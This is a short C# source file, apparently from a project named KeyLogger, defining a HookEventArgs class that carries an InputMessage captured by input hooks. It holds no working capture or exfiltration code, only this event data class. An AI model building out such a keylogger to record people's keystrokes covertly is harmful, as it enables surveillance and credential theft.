using System;
using KeyLogger.Messages;

namespace KeyLogger.Catcher.Hooks
{
    public class HookEventArgs : EventArgs
    {
        public InputMessage Message { get; set; }
    }
}